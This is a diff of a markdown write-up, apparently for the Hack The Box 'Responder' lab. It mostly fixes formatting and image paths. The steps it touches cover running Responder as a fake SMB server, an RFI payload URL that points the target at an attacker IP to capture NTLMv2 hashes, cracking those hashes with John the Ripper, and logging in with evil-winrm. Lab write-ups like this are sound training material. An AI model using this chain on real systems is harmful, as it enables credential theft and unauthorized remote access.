@@ -243,10 +243,10 @@ The summary is based on a surface-level review of the article rather than an in-
 **C) Responder & NTLM Hash Capture**
 - Note: If a firewall has been configured, all incoming traffic should be allowed on TCP port 445 for the Responder to catch the hash: `sudo ufw allow 445/tcp`
 - To run the responder: `sudo responder -I tun0` or `sudo python3 /usr/share/responder/Responder.py – I tun0`
-- To execute the RFI exploit: `http://{domain_name}/?{parameter_name} =//{attacker_IP}/somefile`
+- To execute the RFI exploit: `http://{domain_name}/?{parameter_name}=//{attacker_IP}/somefile`
 - With the Responder running and acting as a fake SMB server, the RFI triggers the target machine to authenticate to the attacker. This results in Responder capturing the NTLMv2 hash, including the username, domain, and challenge-response data. 
 
-	![HTB](images/h5-images/b_22.png)   
+	![HTB](images/h5-images/b_202.png)   
 
 **D) Password hash cracking:**
 - With John the Ripper: `$HOME/john/run/john ntlm.hash`
@@ -256,7 +256,7 @@ The summary is based on a surface-level review of the article rather than an in-
 ** E) WinRM Access:**
 - With the recovered/stolen credentials, a session can be established on the target machine using `evil-winrm`
 	- ` sudo evil-winrm -i {target_IP} -u {username} -p {password} `
-	- `evil-winrm` tool to connect to Windows machines remotely using WinRM
+	- `evil-winrm` - A tool to connect to Windows machines remotely using WinRM
 
 - Subsequently, commands can be executed remotely on the compromised target and the flag can be retrieved. 
 
@@ -265,11 +265,11 @@ The summary is based on a surface-level review of the article rather than an in-
 
 **<ins>5. Completion of the Responder machine</ins>**  
 
-	![HTB](images/h5-images/b_99.png)   
-	
-	![HTB](images/h5-images/b_100.png)   
-	
-	![HTB](images/h5-images/b_101.png)   
+   ![HTB](images/h5-images/b_99.png)   
+
+   ![HTB](images/h5-images/b_100.png)   
+
+   ![HTB](images/h5-images/b_101.png)   
 	
 
 
